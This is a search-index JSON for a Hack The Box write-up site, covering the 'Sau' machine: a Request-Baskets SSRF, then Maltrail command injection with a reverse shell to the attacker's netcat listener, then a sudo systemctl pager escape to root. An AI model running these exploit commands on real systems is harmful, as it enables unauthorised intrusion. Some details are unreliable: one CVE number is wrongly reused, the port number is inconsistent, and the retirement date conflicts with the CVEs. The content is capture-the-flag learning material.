{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hack\u00a0The\u00a0Box\u00a0Write\u2011ups","text":"<p>Welcome to my repository of Hack The Box (HTB) machine write-ups. Each entry is documented with a complete attack chain from enumeration to privilege escalation while explaining why every step works.</p>"},{"location":"#1-how-to-navigate-this-repository","title":"1\u00a0\u00a0How to Navigate this Repository","text":"<ol> <li> <p>Pick a machine from the left\u2011hand sidebar (or the list below).</p> </li> <li> <p>Follow the numbered sections inside each write\u2011up:</p> </li> <li> <p>Synopsis\u00a0\u2014 key facts</p> </li> <li>Enumeration\u00a0\u2014 ports, services, and initial findings</li> <li>Foothold\u00a0\u2014 gaining the first shell</li> <li>Privilege Escalation\u00a0\u2014 method and exploit</li> <li> <p>Lessons Learned\u00a0/\u00a0References</p> </li> <li> <p>Use the built\u2011in search (top\u2011right) to jump directly to commands, CVEs, or tools.</p> </li> </ol>"},{"location":"#2-current-writeups","title":"2\u00a0\u00a0Current Write\u2011ups","text":"Difficulty Machine Attack Path Easy Sau SSRF --&gt; Maltrail\u00a00.53 RCE --&gt; <code>systemctl</code> pager escape"},{"location":"#4-methodology-snapshot","title":"4\u00a0\u00a0Methodology Snapshot","text":"<ol> <li>Enumeration\u00a0: <code>nmap</code>.</li> <li>Exploitation\u00a0:  I prefer crafting manual payloads and analyzing CVE-related exploit scripts. I only rely on Metasploit when needed.</li> <li>Post\u2011Exploitation\u00a0:  Privilege Escalation and root access.</li> <li>Documentation\u00a0:  Screenshots, code blocks, and links to official advisories.</li> </ol> <p>Maintained by Mohamed\u00a0Trigui \u2013 last update: <code>2025\u201105\u201128</code>.</p>"},{"location":"Sau/Sau/","title":"Sau (HackTheBox | Easy | Retired 15 Apr 2022)","text":"<p>Path To Root: SSRF \u2192 internal panel access \u2192 unauthenticated command injection \u2192 user shell \u2192 sudo misconfiguration \u2192 root.</p>"},{"location":"Sau/Sau/#synopsis","title":"Synopsis","text":"<p>Sau is an easy-level HTB box that runs a Request-Baskets instance vulnerable to SSRF (CVE-2023-27163). It gave me a solid, hands-on understanding of Server-Side Request Forgery (SSRF). By abusing that flaw I was able to a filtere Maltrail panel that is vulnerable to unauthenticated OS-command injection. One payload later, I landed a reverse shell as the user <code>puma</code>. From there a sloppy <code>sudo</code> configuration handed me root.</p>"},{"location":"Sau/Sau/#skills-required","title":"Skills Required","text":"<ul> <li>Web Enumeration</li> <li>Linux Fundamentals</li> </ul>"},{"location":"Sau/Sau/#skills-learned","title":"Skills Learned","text":"<ul> <li>Command Injection</li> <li>Server Side Request Forgery</li> <li>Sudo Exploitation</li> </ul>"},{"location":"Sau/Sau/#enumeration","title":"Enumeration","text":""},{"location":"Sau/Sau/#1-nmap","title":"1. Nmap","text":"<pre><code>nmap -sV 10.10.11.224\n</code></pre> <p>The nmap scan reveals that <code>OpenSSH</code> is running on the default <code>SSH</code> port (22). Port 80 appears to be filtered, likely due to a firewall rule restricting inbound <code>HTTP</code> traffic. Additionally, an HTTP service is accessible on port 5555, which indicates a non-standard web service might be running there.</p>"},{"location":"Sau/Sau/#2-requestbaskets-ssrf-to-maltrail","title":"2. Request\u2011Baskets SSRF to Maltrail","text":"<p>Since port <code>80</code> is filtered, I started exploring port <code>55555</code>, which revealed a <code>Request Baskets</code> instance running. <code>Request Baskets</code> is a web service that collects HTTP requests via a RESTful API.</p> <p>I noticed the version was <code>1.2.1</code>, and after a quick Google search, I found that this version is vulnerable to <code>CVE-2023-27163</code>: a Server-Side Request Forgery (SSRF) via the <code>/api/baskets/{name}</code> component, which allows attackers to make internal requests to services that should be unreachable. </p> <p>I immediately thought of targeting the filtered HTTP port <code>80</code> by forcing the application to make a request to it. I searched for some PoC scripts and found one that sets up a proxy basket to relay requests to an internal service.</p> <p>To exploit it, I used the following command to trigger a request to the internal web service running on port <code>80</code>:</p> <pre><code>bash ./exploit-basket.sh http://10.10.11.224:55555/ http://127.0.0.1:80\n</code></pre> <p></p> <p>Following the exploit, I was able to access the crafted URL, which successfully forwarded the request to the internal port <code>80</code>. This revealed a <code>Maltrail</code> instance running on version <code>0.53</code>, which is vulnnerable to Unauthenticated Remote Code Execution (RCE) (CVE-2023\u201327163).</p>"},{"location":"Sau/Sau/#_1","title":"Sau (HackTheBox | Easy | Retired 15 Apr 2022)","text":""},{"location":"Sau/Sau/#foothold","title":"Foothold","text":"<p>I searched for a proof-of-concept exploit and found a script that constructs a <code>curl</code> command to send a payload to the target URL through the login endpoint, which opens a shell on the victim machine.</p> <p>I set up a <code>netcat</code> listener on port <code>4444</code> on my machine (attacker machine), and ran the script with:</p> <pre><code>python3 exploit-maltrail.py 10.10.14.9 4444 http://10.10.11.224:55555/qmhvxq\n</code></pre> <p>I obtained a shell on the target and was able to get the <code>user</code> flag.</p> <p></p>"},{"location":"Sau/Sau/#privilege-escalation","title":"Privilege Escalation","text":"<p>The first thing I checked for privilege escalation was <code>sudo</code> permissions for the user <code>puma</code>. I discovered that this user can run <code>/usr/bin/systemctl status trail.service</code> with <code>sudo</code> and no password. </p> <p>I knew that <code>systemctl status</code> pipes output through <code>less</code> by default when the output is long. Since we're running the command with <code>sudo</code>, it opens <code>less</code> as root, which can be exploited. </p> <p>One trick with <code>less</code> is that you can escape to a shell by typing <code>!</code>. So I entered <code>!</code> and got a root shell. </p>"},{"location":"Sau/Sau/#exploitation-scripts","title":"Exploitation Scripts","text":"Script Author Source <code>exploit-basket.sh</code> Iyaad Luqman K Request-Baskets 1.2.1 <code>exploit-maltrail.py</code> spookler (Github) Maltrail-v0.53-Exploit"},{"location":"Sau/Sau/#references","title":"References","text":"<ul> <li>CVE-2023-27163 \u2013 Request-Baskets SSRF</li> <li>Maltrail 0.53 \u2013 Unauthenticated RCE (ExploitDB ID: 51676)</li> </ul>"}]}